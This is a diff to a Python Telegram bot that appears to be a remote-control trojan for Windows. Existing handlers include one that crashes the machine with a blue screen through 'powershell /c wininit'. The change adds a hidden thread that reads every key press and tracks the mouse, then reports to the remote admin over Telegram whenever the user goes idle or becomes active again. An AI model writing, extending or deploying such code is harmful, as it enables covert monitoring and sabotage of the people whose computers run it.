@@ -6,6 +6,7 @@ from datetime import date
 import rotatescreen
 from pynput import keyboard
 import psutil
+import pydirectinput as pdi
 import mss
 import keyboard as kb
 from PIL import Image, ImageDraw
@@ -74,6 +75,7 @@ VIDEO_DURATION = 10  # Длительность видео в секундах
 FPS = 30  # Кадров в секунду
 TEMP_VIDEO_FILE = None  # Обьявим переменную TEMP_VIDEO_FILE перед запуском бота
 RECORDING = False  # Флаг, указывающий, идет ли запись
+global message
 pyautogui.FAILSAFE = False
 
 from urllib.request import urlopen
@@ -287,7 +289,6 @@ check_lock()
 
 
 # Определяем класс для обработки оконных сообщений
-
 
 class Window:
     def __init__(self):
@@ -1207,6 +1208,51 @@ def bsod(message):
             if conf == 'confirm':
                 bot.send_message(message.chat.id, f"Вызываю BSOD через wininit...")
                 os.system('powershell /c wininit')
+
+def keyListener(val):
+    while True:
+        val[0] = kb.read_key()
+
+def afk():
+    #взято с https://github.com/warpaint97/AFKMouseMover
+    timeLimit = 30 # time limit in seconds until AFK Mode kicks in
+    updateTime = 2 # time between mouse movements during AFK mode
+    # internal variables
+    last_pos = None
+    counter = 0
+    afkMode = False
+    isMoving = False
+
+    # threading for key listener
+    keyValue = [None]
+    listener = threading.Thread(target=keyListener, args=(keyValue,), daemon=True)
+    listener.start()
+
+    #main program loop
+    while True:
+        if counter > 0 <= timeLimit and not afkMode:
+            print(f'{timeLimit - counter} seconds before AFK is detected.')
+
+        if counter >= timeLimit:
+            if not afkMode:
+                bot.send_message(admin_id, f'Активность не обнаружена {timeLimit} секунд. Вхожу в режим AFK...')
+            afkMode = True
+
+        time.sleep(1) if not afkMode else time.sleep(updateTime)
+        if last_pos == pdi.position() and keyValue[0] == None:
+            if not afkMode:
+                counter += 1
+        else:
+            if counter > 0 and afkMode == True:
+                bot.send_message(admin_id, 'Активность обнаружена')
+
+            counter = 0
+            afkMode = False
+            keyValue[0] = None
+        last_pos = pdi.position()
+
+is_afk = threading.Thread(target=afk)
+is_afk.start()
 
 @bot.message_handler(commands=['cd'])
 def cd_drive(message):
